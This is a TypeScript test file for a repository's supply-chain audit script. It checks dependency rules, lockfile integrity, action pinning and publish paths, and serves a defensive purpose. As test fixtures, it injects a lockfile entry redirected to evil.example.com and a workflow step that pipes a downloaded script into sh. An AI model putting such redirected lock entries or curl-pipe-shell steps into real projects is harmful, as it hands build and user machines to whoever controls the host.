import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');

type Audit = (inputs: unknown) => string[];

const { auditSupplyChain, readSupplyChainInputs } = await import('../scripts/check-supply-chain.mjs') as {
  auditSupplyChain: Audit;
  readSupplyChainInputs: (root: string) => unknown;
};

/**
 * A property test of the repository is only worth what its counterexamples
 * prove. Every rule below is exercised twice: once against the real checkout,
 * and once against a mutated copy of the real inputs that must produce a named
 * violation. Without the second half the whole file could pass by asserting
 * nothing, which is the failure mode that made the pre-existing two-action
 * pinning check in `ci-hardening.test.ts` weaker than it reads.
 */
function realInputs(): any {
  return readSupplyChainInputs(ROOT) as any;
}

function violationsFor(mutate: (inputs: any) => void): string[] {
  const inputs = realInputs();
  mutate(inputs);
  return auditSupplyChain(inputs);
}

test('supply chain: the real checkout satisfies every declared assurance rule', () => {
  assert.deepEqual(auditSupplyChain(realInputs()), []);
});

test('supply chain: a runtime dependency on the root package is a violation', () => {
  // The zero-runtime-dependency rule was stated in CLAUDE.md and enforced by
  // nothing: adding `dependencies` to package.json left typecheck, the suite,
  // the build, and all four CI jobs green.
  const violations = violationsFor((inputs) => {
    inputs.packageJson.dependencies = { 'left-pad': '^1.3.0' };
  });
  assert.ok(
    violations.some((line) => /package\.json declares runtime dependencies/.test(line)),
    `expected a runtime-dependency violation, got ${JSON.stringify(violations)}`,
  );

  for (const field of ['optionalDependencies', 'peerDependencies', 'bundleDependencies']) {
    const sneaked = violationsFor((inputs) => {
      inputs.packageJson[field] = field === 'bundleDependencies' ? ['left-pad'] : { 'left-pad': '^1.3.0' };
    });
    assert.ok(
      sneaked.some((line) => line.includes(field)),
      `${field} is another way to acquire a runtime dependency and must also fail`,
    );
  }
});

test('supply chain: the devDependency allowlist is exact in both directions', () => {
  const added = violationsFor((inputs) => {
    inputs.packageJson.devDependencies.eslint = '^9.0.0';
  });
  assert.ok(
    added.some((line) => /unexpected devDependencies: eslint/.test(line)),
    `expected an unexpected-devDependency violation, got ${JSON.stringify(added)}`,
  );

  const removed = violationsFor((inputs) => {
    delete inputs.packageJson.devDependencies.typescript;
  });
  assert.ok(
    removed.some((line) => /missing required devDependencies: typescript/.test(line)),
    'dropping the compiler must fail too, or the rule only bounds growth',
  );
});

test('supply chain: the lockfile cannot drift from the manifest it locks', () => {
  // `npm ci` refuses an out-of-sync tree, but only in CI and only after a
  // network install. This is the same claim made locally and statically.
  const driftedDeps = violationsFor((inputs) => {
    inputs.packageLock.packages[''].devDependencies.typescript = '^6.0.0';
  });
  assert.ok(
    driftedDeps.some((line) => /package-lock\.json root mirror disagrees/.test(line)),
    `expected a lock/manifest drift violation, got ${JSON.stringify(driftedDeps)}`,
  );

  const driftedName = violationsFor((inputs) => {
    inputs.packageLock.name = 'not-fiscus';
  });
  assert.ok(
    driftedName.some((line) => /package-lock\.json name/.test(line)),
    'a lockfile for a different package must not be accepted',
  );

  const smuggled = violationsFor((inputs) => {
    inputs.packageLock.packages['node_modules/left-pad'] = {
      version: '1.3.0',
      resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz',
      integrity: `sha512-${'A'.repeat(86)}==`,
    };
  });
  assert.ok(
    smuggled.some((line) => /installs at runtime/.test(line) && line.includes('left-pad')),
    'a lock entry not marked dev is a package that ships to users, whatever package.json says',
  );
});

test('supply chain: every locked package is registry-resolved and integrity-pinned', () => {
  // `npm ci` verifies each tarball against the lockfile's OWN integrity field,
  // so a lockfile that is itself modified is trusted completely. Nothing
  // previously constrained what a lockfile in this repo was allowed to say.
  const rehomed = violationsFor((inputs) => {
    inputs.packageLock.packages['node_modules/typescript'].resolved =
      'https://evil.example.com/typescript/-/typescript-7.0.2.tgz';
  });
  assert.ok(
    rehomed.some((line) => /resolved host/.test(line) && line.includes('evil.example.com')),
    `expected a resolved-host violation, got ${JSON.stringify(rehomed)}`,
  );

  const unverified = violationsFor((inputs) => {
    delete inputs.packageLock.packages['node_modules/typescript'].integrity;
  });
  assert.ok(
    unverified.some((line) => /no integrity hash/.test(line)),
    'an entry with no integrity hash installs whatever the host returns',
  );

  const weak = violationsFor((inputs) => {
    inputs.packageLock.packages['node_modules/typescript'].integrity = `sha1-${'A'.repeat(27)}=`;
  });
  assert.ok(
    weak.some((line) => /weak integrity/.test(line)),
    'sha1 is collision-attackable and must not satisfy the integrity requirement',
  );

  const plaintext = violationsFor((inputs) => {
    inputs.packageLock.packages['node_modules/typescript'].resolved =
      'http://registry.npmjs.org/typescript/-/typescript-7.0.2.tgz';
  });
  assert.ok(
    plaintext.some((line) => /must resolve over https/.test(line)),
    'a plaintext fetch is tamperable before integrity is ever computed',
  );
});

test('supply chain: team-server is a second install surface and is held to the same lock hygiene', () => {
  // team-server has its own package.json, its own node_modules, and `pg` as a
  // real runtime dependency. It is exempt from the zero-dependency rule and
  // from nothing else — its lockfile is installed by CI exactly like the root.
  const inputs = realInputs();
  assert.ok(inputs.teamServerLock, 'team-server/package-lock.json must exist and be audited');

  const rehomed = violationsFor((mutable) => {
    mutable.teamServerLock.packages['node_modules/pg'].resolved =
      'https://evil.example.com/pg/-/pg-8.23.0.tgz';
  });
  assert.ok(
    rehomed.some((line) => line.includes('team-server/package-lock.json') && line.includes('evil.example.com')),
    `expected a team-server resolved-host violation, got ${JSON.stringify(rehomed)}`,
  );
});

test('supply chain: every workflow action is pinned to an immutable commit, not only the two named ones', () => {
  // `ci-hardening.test.ts` asserts that actions/checkout and actions/setup-node
  // carry 40-hex pins. It is an allowlist of two: a third action introduced at
  // a mutable tag satisfied every existing assertion while handing whoever
  // controls that tag arbitrary code execution in CI.
  const tagged = violationsFor((inputs) => {
    inputs.workflows[0].text = inputs.workflows[0].text.replace(
      /(\n\s+)- uses: actions\/checkout@/,
      '$1- uses: some-org/publish-action@v1$1- uses: actions/checkout@',
    );
  });
  assert.ok(
    tagged.some((line) => /not pinned to a 40-character commit sha/.test(line) && line.includes('some-org/publish-action@v1')),
    `expected an unpinned-action violation, got ${JSON.stringify(tagged)}`,
  );

  // Derive the existing pins from the file rather than naming a sha. A routine
  // action bump would otherwise turn these mutations into no-ops that fail with
  // a message about the wrong thing.
  const shortSha = violationsFor((inputs) => {
    inputs.workflows[0].text = inputs.workflows[0].text.replaceAll(
      /@([0-9a-f]{40})\b/g,
      (_match: string, sha: string) => `@${sha.slice(0, 7)}`,
    );
  });
  assert.ok(
    shortSha.some((line) => /not pinned to a 40-character commit sha/.test(line)),
    'an abbreviated sha is not a pin: it is a prefix that a future object can also match',
  );

  const uncommented = violationsFor((inputs) => {
    inputs.workflows[0].text = inputs.workflows[0].text.replaceAll(/([0-9a-f]{40})\s+#\s*\S+/g, '$1');
  });
  assert.ok(
    uncommented.some((line) => /no version comment/.test(line)),
    'a bare 40-hex pin is unreviewable — the comment is how a human checks what was pinned',
  );
});

test('supply chain: workflows install the repository from its lockfile, never resolve fresh', () => {
  const loose = violationsFor((inputs) => {
    inputs.workflows[0].text = inputs.workflows[0].text.replace('      - run: npm ci\n', '      - run: npm install\n');
  });
  assert.ok(
    loose.some((line) => /installs without a lockfile/.test(line)),
    `expected an npm-install violation, got ${JSON.stringify(loose)}`,
  );

  // The package-smoke job deliberately runs `npm install ../fiscus-pack/*.tgz`
  // to install the packed tarball into a clean directory. That is an install of
  // a named local artifact, not a fresh resolve of this repo's tree, and the
  // rule must not collapse the two or the only real packaging proof in CI dies.
  assert.deepEqual(
    auditSupplyChain(realInputs()).filter((line) => /installs without a lockfile/.test(line)),
    [],
    'installing the packed tarball by path is not a lockfile bypass',
  );
});

test('supply chain: no workflow executes code fetched at build time', () => {
  const piped = violationsFor((inputs) => {
    inputs.workflows[0].text += '\n      - run: curl -sSf https://example.com/install.sh | sh\n';
  });
  assert.ok(
    piped.some((line) => /pipes a downloaded script into a shell/.test(line)),
    `expected a curl-pipe-shell violation, got ${JSON.stringify(piped)}`,
  );
});

test('supply chain: the publish allowlist cannot name an internal or local path', () => {
  // The repo is public and `.codex/` is gitignored, which stops git and not
  // npm: the `files` allowlist overrides .gitignore during `npm pack`, so a
  // single entry would put local orchestration state into a published tarball.
  const internal = violationsFor((inputs) => {
    inputs.packageJson.files.push('.codex');
  });
  assert.ok(
    internal.some((line) => /internal or hidden path/.test(line) && line.includes('.codex')),
    `expected an internal-path violation, got ${JSON.stringify(internal)}`,
  );

  const planning = violationsFor((inputs) => {
    inputs.packageJson.files.push('docs/planning');
  });
  assert.ok(
    planning.some((line) => line.includes('docs/planning')),
    'gitignored internal planning docs must not be publishable either',
  );

  const local = violationsFor((inputs) => {
    inputs.packageJson.files.push('C:/Users/someone/Documents/Fiscus/extra');
  });
  assert.ok(
    local.some((line) => /absolute or machine-local path/.test(line)),
    'an absolute path in `files` leaks a developer filesystem layout into a public manifest',
  );

  const escaping = violationsFor((inputs) => {
    inputs.packageJson.files.push('../secrets');
  });
  assert.ok(
    escaping.some((line) => /escapes the package root/.test(line)),
    'a traversal entry must not be accepted',
  );
});

test('supply chain: the audit reads every workflow, not a hard-coded filename', () => {
  // A second workflow file is the obvious way for an unpinned action to enter
  // the repository without touching ci.yml.
  const inputs = realInputs();
  const onDisk = readdirSync(join(ROOT, '.github', 'workflows'))
    .filter((name) => name.endsWith('.yml') || name.endsWith('.yaml'))
    .sort();
  assert.deepEqual(inputs.workflows.map((w: { name: string }) => w.name).sort(), onDisk);
  assert.ok(onDisk.length > 0, 'the audit must not pass by finding no workflows at all');
});

test('supply chain: the checker is wired into an npm script so it is runnable outside the suite', () => {
  const packageJson = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as {
    scripts?: Record<string, string>;
  };
  const script = packageJson.scripts?.['verify:supply-chain'];
  assert.ok(script, 'a supply-chain gate that only exists inside a test file cannot be run before a push');
  assert.match(script, /scripts\/check-supply-chain\.mjs/);
});
